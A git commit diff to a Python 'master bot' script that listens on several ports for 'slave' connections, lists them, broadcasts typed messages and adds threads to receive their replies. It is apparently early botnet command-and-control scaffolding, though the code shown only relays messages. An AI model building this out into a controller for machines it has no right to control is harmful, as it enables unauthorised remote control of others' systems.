ad8126d6cb01d5384bee37ebc9635ae259161a17
vinayak dubey <vinayak.dubey2019@vitstudent.ac.in>
2021-01-25 03:09:13 +0530

    tried to add slave msging the master using threads.

--- master/master.py
+++ master/master.py
@@ -15,17 +15,27 @@ def listen(port):
     slave, slave_address = s.accept()
     slaves.append(slave)
 
+def getSlaveMsg(s):
+    while True:
+        msg=s.recv(1024).decode()
+        print("[+] Slave said: ", msg)
+
 def main():
     print("[+] Master bot listening for incoming connections")
     for i in range(max_bots):
-        thread = Thread(target=listen,args=(i+initial_port,), daemon=True)
-        threads.append(thread)
-        thread.start()
+        ListenerThread = Thread(target=listen,args=(i+initial_port,), daemon=True)
+        threads.append(ListenerThread)
+        ListenerThread.start()
+
     while True:
         if len(slaves)!=0:
             print("[+] Enumerating all slaves.")
             for index, individual_slave in enumerate(slaves):
                 print("[i] ", index, ". slave ip: ", individual_slave.getpeername())
+                try:
+                    Thread(target=getSlaveMsg,args=(individual_slave,),daemon=True).start()
+                except:
+                    print("[E] Error starting msg reciever thread for master")
             while True:
                 msg = input("[+] enter message: ")
                 for slave in slaves:
@@ -37,4 +47,8 @@ def main():
 
 
 if __name__=="__main__":
-    main()
+    try:
+        main()
+    except:
+        print("Exiting")
+        exit
